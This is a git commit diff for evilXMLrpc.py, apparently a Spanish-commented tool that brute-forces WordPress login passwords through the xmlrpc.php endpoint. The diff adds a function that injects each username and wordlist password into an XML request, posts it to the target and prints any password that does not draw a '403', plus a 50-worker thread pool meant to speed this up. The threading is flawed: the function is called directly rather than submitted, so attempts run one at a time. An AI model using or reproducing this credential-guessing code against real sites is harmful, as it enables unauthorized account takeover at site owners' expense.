c6d386430fe36cc82464e003eac82146a5a22fa9
liandd <juandavidtv24@gmail.com>
2025-07-01 02:25:36 -0500

    Máximo 50 hilos por petición

--- evilXMLrpc.py
+++ evilXMLrpc.py
@@ -7,6 +7,8 @@ import argparse
 import os
 import requests
 import re
+from concurrent.futures import ThreadPoolExecutor
+import threading
 
 
 # Ctrl_c
@@ -37,11 +39,12 @@ def get_arguments():
 
 def XMLrpc_ffuf(url):
     """Revisar que la url tenga un xmlrpc.php valido !(tampered, disabled, hardcoded, not working)"""
-    url = url+'/xmlrpc.php'
+    global cms_url
+    cms_url = url+'/xmlrpc.php'
     if os.path.exists("request.xml"):
         with open("request.xml", "r") as xml_request:
             data = xml_request.read()
-            raw_response = requests.post(url, data=data)
+            raw_response = requests.post(cms_url, data=data)
             response = raw_response.text
             regex = r"wp.{4}+[U].*[B].*s\b"
             if re.findall(regex, response):
@@ -58,20 +61,47 @@ def XMLrpc_ffuf(url):
 <methodName>system.listMethods</methodName>
 <params></params>
 </methodCall>""")
-
         XMLrpc_ffuf(url)
+
+
+def passwd_ffuz(user, passwd):
+    if stop_event.is_set():
+        return
+    data = ""
+    with open("file.xml", "r") as xml_to_fuzz:
+        data = xml_to_fuzz.read()
+        user_regex = "...{.{5}+[u].*[}]"
+        passwd_regex = "...{.{5}+[p].*[}]"
+        tmp_data_regex = re.sub(user_regex, user, data)
+        data_regex = re.sub(passwd_regex, passwd, tmp_data_regex)
+        raw_response = requests.post(cms_url, data=data_regex)
+        response = raw_response.text
+        error_regex = "403"
+        if re.findall(error_regex, response):
+            return
+        else:
+            print(
+                colored(f"\n[+] La contraseña para el usuario {user} es {passwd}\n", "green"))
+            stop_event.set()
+            return
 
 
 def XMLbrute_force(url, name, wordlist):
     XMLrpc_ffuf(url)
     """Revisa la estructura XML para identificar si es posible hacer el ataque"""
-    # xml_file = "file.xml"
-    # with open(xml_file, "rw") as xml:
-    #    xml.write()
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        with open(wordlist, "r") as w:
+            for secret in w:
+                if stop_event.is_set():
+                    break
+                executor.submit(passwd_ffuz(name, secret))
+            executor.shutdown(wait=True)
 
 
 def main():
     URL, NAME, WORDLIST = get_arguments()
+    global stop_event
+    stop_event = threading.Event()
     XMLbrute_force(URL, NAME, WORDLIST)
     sys.exit(0)
 
